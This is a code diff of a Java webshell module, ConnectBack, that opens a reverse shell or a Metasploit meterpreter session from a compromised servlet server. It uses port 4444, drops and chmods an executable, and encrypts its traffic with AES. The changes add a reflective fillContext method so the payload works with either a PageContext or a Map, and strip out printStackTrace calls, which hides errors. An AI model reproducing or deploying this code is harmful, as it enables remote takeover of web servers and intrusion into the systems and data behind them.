@@ -36,7 +36,6 @@ import javax.servlet.ServletOutputStream;
 import javax.servlet.ServletRequest;
 import javax.servlet.ServletResponse;
 import javax.servlet.http.HttpSession;
-import javax.servlet.jsp.PageContext;
 
 public class ConnectBack extends ClassLoader implements Runnable {
    public static String type;
@@ -62,13 +61,10 @@ public class ConnectBack extends ClassLoader implements Runnable {
    }
 
    public boolean equals(Object obj) {
-      PageContext page = (PageContext)obj;
-      this.Session = page.getSession();
-      this.Response = page.getResponse();
-      this.Request = page.getRequest();
       HashMap result = new HashMap();
 
       try {
+         this.fillContext(obj);
          if (type.equals("shell")) {
             this.shellConnect();
          } else if (type.equals("meter")) {
@@ -76,9 +72,9 @@ public class ConnectBack extends ClassLoader implements Runnable {
          }
 
          result.put("status", "success");
-      } catch (Exception var6) {
+      } catch (Exception var5) {
          result.put("status", "fail");
-         result.put("msg", var6.getMessage());
+         result.put("msg", var5.getMessage());
       }
 
       try {
@@ -86,9 +82,7 @@ public class ConnectBack extends ClassLoader implements Runnable {
          so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
          so.flush();
          so.close();
-         page.getOut().clear();
-      } catch (Exception var5) {
-         var5.printStackTrace();
+      } catch (Exception var4) {
       }
 
       return true;
@@ -149,7 +143,6 @@ public class ConnectBack extends ClassLoader implements Runnable {
          port = "4444";
          c.meterConnect();
       } catch (Exception var2) {
-         var2.printStackTrace();
       }
 
    }
@@ -217,7 +210,6 @@ public class ConnectBack extends ClassLoader implements Runnable {
                   Runtime.getRuntime().exec(new String[]{"chmod", "+x", droppedExecutable}).waitFor();
                }
             } catch (Exception var17) {
-               var17.printStackTrace();
             }
          }
 
@@ -263,7 +255,7 @@ public class ConnectBack extends ClassLoader implements Runnable {
 
          String aesPassword = props.getProperty("AESPassword", (String)null);
          if (aesPassword != null) {
-            Object[] streams = (Object[])Class.forName("metasploit.AESEncryption").getMethod("wrapStreams", InputStream.class, OutputStream.class, String.class).invoke((Object)null, in, out, aesPassword);
+            Object[] streams = (Object[])((Object[])Class.forName("metasploit.AESEncryption").getMethod("wrapStreams", InputStream.class, OutputStream.class, String.class).invoke((Object)null, in, out, aesPassword));
             in = (InputStream)streams[0];
             out = (OutputStream)streams[1];
          }
@@ -316,7 +308,6 @@ public class ConnectBack extends ClassLoader implements Runnable {
          Object stage = clazz.newInstance();
          clazz.getMethod("start", DataInputStream.class, OutputStream.class, String[].class).invoke(stage, in, out, stageParameters);
       } catch (Throwable var11) {
-         var11.printStackTrace();
          var11.printStackTrace(new PrintStream(out));
       }
 
@@ -467,6 +458,21 @@ public class ConnectBack extends ClassLoader implements Runnable {
       cipher.init(1, skeySpec);
       byte[] encrypted = cipher.doFinal(bs);
       return encrypted;
+   }
+
+   private void fillContext(Object obj) throws Exception {
+      if (obj.getClass().getName().indexOf("PageContext") >= 0) {
+         this.Request = (ServletRequest)obj.getClass().getDeclaredMethod("getRequest").invoke(obj);
+         this.Response = (ServletResponse)obj.getClass().getDeclaredMethod("getResponse").invoke(obj);
+         this.Session = (HttpSession)obj.getClass().getDeclaredMethod("getSession").invoke(obj);
+      } else {
+         Map objMap = (Map)obj;
+         this.Session = (HttpSession)objMap.get("session");
+         this.Response = (ServletResponse)objMap.get("response");
+         this.Request = (ServletRequest)objMap.get("request");
+      }
+
+      this.Response.setCharacterEncoding("UTF-8");
    }
 
    static {
